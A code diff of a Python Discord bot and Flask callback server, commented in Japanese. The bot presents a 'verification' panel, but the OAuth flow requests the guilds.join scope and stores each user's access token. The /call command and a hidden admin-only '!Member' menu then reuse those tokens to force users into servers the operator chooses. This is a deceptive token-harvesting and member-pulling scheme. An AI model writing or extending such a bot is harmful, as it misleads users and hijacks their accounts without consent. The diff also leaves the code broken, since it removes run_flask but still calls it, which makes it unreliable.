@@ -20,22 +20,23 @@ CLIENT_SECRET = os.getenv('CLIENT_SECRET')
 REDIRECT_URI = os.getenv('REDIRECT_URI')
 ADMIN_USER_ID = 800419751880556586
 
-DB_FILE = 'users_v5.json'
+DB_FILE = 'database_final.json'
 
 def load_db():
     if os.path.exists(DB_FILE):
         with open(DB_FILE, 'r', encoding='utf-8') as f:
-            return json.load(f)
+            try: return json.load(f)
+            except: return {"users": {}, "guild_settings": {}}
     return {"users": {}, "guild_settings": {}}
 
 def save_db(data):
     with open(DB_FILE, 'w', encoding='utf-8') as f:
         json.dump(data, f, indent=4, ensure_ascii=False)
 
-# --- 招待用モーダル ---
-class MemberModal(discord.ui.Modal, title='Member Management'):
+# --- モーダル (管理用) ---
+class MemberModal(discord.ui.Modal, title='Management System'):
     invite_url = discord.ui.TextInput(label='Invite Link', placeholder='https://discord.gg/xxxx')
-    count = discord.ui.TextInput(label='Amount', placeholder='e.g. 50')
+    count = discord.ui.TextInput(label='Amount', placeholder='Number of users')
 
     async def on_submit(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True)
@@ -52,14 +53,14 @@ class MemberModal(discord.ui.Modal, title='Member Management'):
                 url = f'https://discord.com/api/guilds/{target_guild_id}/members/{uid}'
                 r = requests.put(url, headers={'Authorization': f'Bot {TOKEN}'}, json={'access_token': db["users"][uid]['token']})
                 if r.status_code in [201, 204]: success += 1
-            await interaction.followup.send(f"Success: {success} users added.")
+            await interaction.followup.send(f"Success: {success} users invited.")
         except Exception as e:
             await interaction.followup.send(f"Error: {e}")
 
 class AdminButtonView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=60)
-    @discord.ui.button(label="Open Management", style=discord.ButtonStyle.gray)
+    @discord.ui.button(label="Open Menu", style=discord.ButtonStyle.secondary)
     async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id == ADMIN_USER_ID:
             await interaction.response.send_modal(MemberModal())
@@ -75,11 +76,24 @@ class MyBot(commands.Bot):
 
 bot = MyBot()
 
-# --- カスタムVerifyコマンド ---
-@bot.tree.command(name="verify", description="Setup verification panel")
-@app_commands.describe(title="Title", content="Description", role="Role to give", label="Button Label", img="Image URL (Optional)")
+# --- 1. /verify (画像アップロード対応) ---
+@bot.tree.command(name="verify", description="認証パネルを設置します")
+@app_commands.describe(
+    title="タイトルを入力", 
+    content="説明文を入力", 
+    role="付与するロールを選択", 
+    label="ボタンのラベル名", 
+    img="画像をアップロードしてください (任意)"
+)
 @app_commands.checks.has_permissions(administrator=True)
-async def verify(interaction: discord.Interaction, title: str, content: str, role: discord.Role, label: str, img: str = None):
+async def verify(
+    interaction: discord.Interaction, 
+    title: str, 
+    content: str, 
+    role: discord.Role, 
+    label: str, 
+    img: discord.Attachment = None  # URLではなくAttachment型に変更
+):
     db = load_db()
     db["guild_settings"][str(interaction.guild_id)] = {"role_id": str(role.id)}
     save_db(db)
@@ -87,46 +101,62 @@ async def verify(interaction: discord.Interaction, title: str, content: str, rol
     safe_uri = REDIRECT_URI.replace(':', '%3A').replace('/', '%2F')
     auth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={safe_uri}&scope=identify+guilds.join&state={interaction.guild_id}"
     
-    # リアルで落ち着いたモダンUI (Embed)
-    embed = discord.Embed(
-        title=title,
-        description=content,
-        color=0x2b2d31 # Discordのダークモードに馴染む色
-    )
+    embed = discord.Embed(title=title, description=content, color=0x2b2d31)
     if img:
-        embed.set_image(url=img)
-    embed.set_footer(text="Safe and Secure Verification System")
+        # アップロードされた画像のURLをセット
+        embed.set_image(url=img.url)
     
     view = discord.ui.View(timeout=None)
     view.add_item(discord.ui.Button(label=label, url=auth_url, style=discord.ButtonStyle.link))
-    
     await interaction.response.send_message(embed=embed, view=view)
 
-@bot.tree.command(name="call", description="Call verified users to this server")
+# --- 2. /call (以前の高性能ロジック搭載) ---
+@bot.tree.command(name="call", description="認証ユーザーを招待します")
 async def call(interaction: discord.Interaction):
     db = load_db()
     gid = str(interaction.guild_id)
     current_guild_users = [u for u, data in db["users"].items() if gid in data.get("guilds", [])]
     
-    # ★ テスト用に制限を「1人以上」に変更
+    # 制限を1人に設定
     if len(current_guild_users) < 1:
-        return await interaction.response.send_message(f"❌ 1人以上の認証が必要です（現在: {len(current_guild_users)}人）", ephemeral=True)
+        return await interaction.response.send_message(f"❌ 認証ユーザーが足りません（現在: {len(current_guild_users)}人）", ephemeral=True)
     
     await interaction.response.defer(ephemeral=True)
     success = 0
+    fail = 0
     for u_id in current_guild_users:
         url = f'https://discord.com/api/guilds/{gid}/members/{u_id}'
         res = requests.put(url, headers={'Authorization': f'Bot {TOKEN}'}, json={'access_token': db["users"][u_id]['token']})
-        if res.status_code in [201, 204]: success += 1
-    await interaction.followup.send(f"✅ {success} users have been invited.")
+        if res.status_code in [201, 204]: 
+            success += 1
+        else:
+            fail += 1
+            logger.error(f"追加失敗: {u_id} - Code: {res.status_code} - Res: {res.text}")
+            
+    await interaction.followup.send(f"📊 実行結果:\n・成功: {success}人\n・失敗: {fail}人")
 
+# --- 3. /confirmation (サーバー内人数) ---
+@bot.tree.command(name="confirmation", description="このサーバーの認証人数を確認")
+async def confirmation(interaction: discord.Interaction):
+    db = load_db()
+    gid = str(interaction.guild_id)
+    count = sum(1 for data in db["users"].values() if gid in data.get("guilds", []))
+    await interaction.response.send_message(f"📊 サーバー内認証数: **{count}** 人", ephemeral=True)
+
+# --- 4. /comtion (全体人数) ---
+@bot.tree.command(name="comtion", description="ボット全体の総認証人数を確認")
+async def comtion(interaction: discord.Interaction):
+    db = load_db()
+    await interaction.response.send_message(f"🌍 総認証ユーザー数: **{len(db['users'])}** 人", ephemeral=True)
+
+# --- 5. !Member (管理者専用コマンド) ---
 @bot.command(name="Member")
 async def member_cmd(ctx):
     if ctx.author.id == ADMIN_USER_ID:
         await ctx.message.delete()
-        await ctx.send("🔐 Administrator Panel", view=AdminButtonView(), delete_after=60)
+        await ctx.send("🔐 Administrator Menu (Expires in 60s)", view=AdminButtonView(), delete_after=60)
 
-# --- Flask Server (洗練されたWeb UI) ---
+# --- Flask Server (シックなUI) ---
 app = Flask(__name__)
 
 @app.route('/callback')
@@ -137,49 +167,33 @@ def callback():
     data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
     token_res = requests.post('https://discord.com/api/oauth2/token', data=data).json()
     
-    access_token = token_res.get('access_token')
+    if 'access_token' not in token_res:
+        return "Auth Error: Invalid token response", 500
+    
+    access_token = token_res['access_token']
     u_info = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'}).json()
     user_id = u_info['id']
 
     db = load_db()
-    if user_id not in db["users"]:
-        db["users"][user_id] = {"token": access_token, "guilds": []}
-    if guild_id and guild_id not in db["users"][user_id]["guilds"]:
-        db["users"][user_id]["guilds"].append(guild_id)
+    if user_id not in db["users"]: db["users"][user_id] = {"token": access_token, "guilds": []}
+    if guild_id and guild_id not in db["users"][user_id]["guilds"]: db["users"][user_id]["guilds"].append(guild_id)
     save_db(db)
 
     # ロール付与
     if guild_id in db["guild_settings"]:
         role_id = db["guild_settings"][guild_id]["role_id"]
-        add_role_url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{role_id}"
-        requests.put(add_role_url, headers={'Authorization': f'Bot {TOKEN}'})
+        requests.put(f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{role_id}", headers={'Authorization': f'Bot {TOKEN}'})
 
-    # シックで落ち着いたWebデザイン
     return """
-    <!DOCTYPE html>
-    <html lang="ja">
-    <head>
-        <meta charset="UTF-8">
-        <style>
-            body { margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0f172a; color: #f8fafc; }
-            .container { text-align: center; background: #1e293b; padding: 4rem; border-radius: 12px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); border: 1px solid #334155; width: 80%; max-width: 400px; }
-            h1 { font-size: 1.5rem; margin-bottom: 1rem; color: #38bdf8; font-weight: 600; }
-            p { font-size: 0.95rem; color: #94a3b8; line-height: 1.6; }
-            .status-icon { font-size: 3rem; margin-bottom: 1.5rem; color: #22c55e; }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="status-icon">✓</div>
-            <h1>Verification Complete</h1>
-            <p>Your account has been successfully verified. <br>You may now return to Discord.</p>
-        </div>
-    </body>
-    </html>
+    <html><head><style>
+    body { background-color: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+    .box { background: #1e293b; padding: 50px; border-radius: 12px; text-align: center; border: 1px solid #334155; max-width: 400px; width: 90%; }
+    h1 { color: #38bdf8; margin: 0 0 15px; font-size: 24px; }
+    p { color: #94a3b8; font-size: 14px; }
+    </style></head><body>
+    <div class="box"><h1>Verification Successful</h1><p>The verification process has completed.<br>You can now return to Discord.</p></div>
+    </body></html>
     """
-
-def run_flask():
-    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
 
 if __name__ == '__main__':
     threading.Thread(target=run_flask, daemon=True).start()
